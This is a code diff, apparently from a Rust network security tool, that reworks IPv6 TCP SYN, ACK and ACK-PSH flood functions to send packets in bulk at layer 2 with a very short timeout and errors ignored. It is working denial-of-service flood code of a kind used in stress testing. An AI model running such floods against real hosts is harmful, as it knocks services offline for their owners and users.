@@ -1,3 +1,4 @@
+use pnet::packet::ethernet::EtherTypes;
 use pnet::packet::ip::IpNextHeaderProtocols;
 use pnet::packet::ipv6::MutableIpv6Packet;
 use pnet::packet::tcp::MutableTcpPacket;
@@ -6,11 +7,13 @@ use pnet::packet::tcp::ipv6_checksum;
 use rand::Rng;
 use std::net::Ipv6Addr;
 use std::panic::Location;
+use std::time::Duration;
 
 use crate::error::PistolError;
 use crate::layer::IPV6_HEADER_SIZE;
+use crate::layer::Layer2;
 use crate::layer::TCP_HEADER_SIZE;
-use crate::layer::layer3_ipv6_send;
+use crate::route::get_dst_mac_and_src_if;
 
 const TCP_DATA_SIZE: usize = 0;
 const TTL: u8 = 255;
@@ -64,11 +67,16 @@ pub fn send_syn_flood_packet(
     tcp_header.set_data_offset(5);
     let checksum = ipv6_checksum(&tcp_header.to_immutable(), &src_ipv6, &dst_ipv6);
     tcp_header.set_checksum(checksum);
-    let timeout = None;
 
-    for _ in 0..max_same_packet {
-        let _ret = layer3_ipv6_send(dst_ipv6, src_ipv6, &ipv6_buff, vec![], timeout, false)?;
-    }
+    // very short timeout for flood attack
+    let timeout = Duration::from_secs_f32(0.01);
+    let ether_type = EtherTypes::Ipv6;
+    let (dst_mac, interface) = get_dst_mac_and_src_if(dst_ipv6.into(), src_ipv6.into(), timeout)?;
+    let layer2 = Layer2::new(dst_mac, interface, ether_type, timeout, false);
+
+    // ignore the error
+    let _ = layer2.send_flood(&ipv6_buff, max_same_packet);
+
     Ok(ipv6_buff.len() * max_same_packet)
 }
 
@@ -121,11 +129,16 @@ pub fn send_ack_flood_packet(
     tcp_header.set_data_offset(5);
     let checksum = ipv6_checksum(&tcp_header.to_immutable(), &src_ipv6, &dst_ipv6);
     tcp_header.set_checksum(checksum);
-    let timeout = None;
 
-    for _ in 0..max_same_packet {
-        let _ret = layer3_ipv6_send(dst_ipv6, src_ipv6, &ipv6_buff, vec![], timeout, false)?;
-    }
+    // very short timeout for flood attack
+    let timeout = Duration::from_secs_f32(0.01);
+    let ether_type = EtherTypes::Ipv6;
+    let (dst_mac, interface) = get_dst_mac_and_src_if(dst_ipv6.into(), src_ipv6.into(), timeout)?;
+    let layer2 = Layer2::new(dst_mac, interface, ether_type, timeout, false);
+
+    // ignore the error
+    let _ = layer2.send_flood(&ipv6_buff, max_same_packet);
+
     Ok(ipv6_buff.len() * max_same_packet)
 }
 
@@ -178,10 +191,15 @@ pub fn send_ack_psh_flood_packet(
     tcp_header.set_data_offset(5);
     let checksum = ipv6_checksum(&tcp_header.to_immutable(), &src_ipv6, &dst_ipv6);
     tcp_header.set_checksum(checksum);
-    let timeout = None;
 
-    for _ in 0..max_same_packet {
-        let _ret = layer3_ipv6_send(dst_ipv6, src_ipv6, &ipv6_buff, vec![], timeout, false)?;
-    }
+    // very short timeout for flood attack
+    let timeout = Duration::from_secs_f32(0.01);
+    let ether_type = EtherTypes::Ipv6;
+    let (dst_mac, interface) = get_dst_mac_and_src_if(dst_ipv6.into(), src_ipv6.into(), timeout)?;
+    let layer2 = Layer2::new(dst_mac, interface, ether_type, timeout, false);
+
+    // ignore the error
+    let _ = layer2.send_flood(&ipv6_buff, max_same_packet);
+
     Ok(ipv6_buff.len() * max_same_packet)
 }
